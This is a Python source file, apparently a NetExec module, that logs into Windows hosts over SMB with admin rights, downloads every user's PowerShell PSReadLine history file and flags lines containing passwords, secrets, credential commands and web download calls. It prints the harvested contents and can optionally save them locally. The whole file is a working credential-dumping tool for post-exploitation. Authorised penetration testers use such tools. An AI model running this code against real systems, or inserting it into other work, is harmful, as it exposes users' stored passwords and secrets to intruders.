from dataclasses import dataclass
from datetime import datetime
from io import BytesIO
from pathlib import Path

from impacket.nt_errors import STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND
from impacket.smbconnection import SessionError
from nxc.helpers.misc import CATEGORY
from nxc.helpers.path import sanitize_filename
from nxc.paths import NXC_PATH
from nxc.playbooks.results import ActionResult, Artifact, ResultStatus


class NXCModule:
    # Module by @357384n, modified by @Defte_
    name = "powershell_history"
    description = "Extracts PowerShell history for all users and looks for sensitive commands."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING
    false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
    sensitive_keywords = [
        "password", "passw", "secret", "credential", "key",
        "get-credential", "convertto-securestring", "set-localuser",
        "new-localuser", "set-adaccountpassword", "new-object system.net.webclient",
        "invoke-webrequest", "invoke-restmethod",
    ]

    @dataclass
    class ResultData:
        files: list[dict]
        queried_users: list[str]

    result_type = ResultData

    def options(self, context, module_options):
        """EXPORT    Save each history file under NXC_PATH (default: false)"""
        self.export = str(module_options.get("EXPORT", False)).lower() in ("true", "1", "yes")

    def on_admin_login(self, context, connection):
        records, queried_users, errors, artifacts = [], [], [], []
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        ignored = {name.casefold() for name in self.false_positive}
        try:
            for directory in connection.conn.listPath("C$", "Users\\*"):
                user = directory.get_longname()
                if user.casefold() in ignored or not directory.is_directory():
                    continue
                history_dir = f"Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\"
                queried_users.append(user)
                try:
                    files = connection.conn.listPath("C$", f"{history_dir}*")
                except SessionError as e:
                    if e.getErrorCode() in (STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND):
                        continue
                    raise
                for file in files:
                    name = file.get_longname()
                    if name.casefold() in ignored or file.is_directory():
                        continue
                    record = {"user": user, "path": history_dir + name, "content": b"", "text": "", "keywords": [], "complete": False, "error": None}
                    records.append(record)
                    with BytesIO() as buffer:
                        try:
                            connection.conn.getFile("C$", record["path"], buffer.write)
                            record["complete"] = True
                        except Exception as e:
                            record["error"] = str(e) or type(e).__name__
                            raise
                        finally:
                            record["content"] = buffer.getvalue()
                            record["text"] = record["content"].decode("utf-8-sig", errors="replace")
                    record["keywords"] = [keyword.upper() for keyword in self.sensitive_keywords if keyword in record["text"].lower()]
                    context.log.highlight(f"C:\\{record['path']} [ {' '.join(record['keywords'])} ]")
                    for line in record["text"].splitlines():
                        context.log.highlight(f"\t{line}")
                    if self.export:
                        path = Path(NXC_PATH) / "modules" / "powershell_history" / f"{sanitize_filename(connection.host)}_{sanitize_filename(user)}_{stamp}_{len(records)}_{sanitize_filename(name)}"
                        try:
                            path.parent.mkdir(parents=True, exist_ok=True)
                            path.write_bytes(record["content"])
                            artifacts.append(Artifact(path, "powershell_history"))
                            context.log.highlight(f"PowerShell history written to: {path}")
                        except Exception as e:
                            record["error"] = str(e) or type(e).__name__
                            raise
        except Exception as e:
            errors.append(str(e) or type(e).__name__)
            context.log.fail(errors[-1])
        return ActionResult(
            "smb", self.name, connection.host,
            ResultStatus.FAILED if errors else ResultStatus.SUCCESS if records else ResultStatus.NEGATIVE,
            self.ResultData(records, queried_users), artifacts=artifacts, error="; ".join(errors) or None,
        )
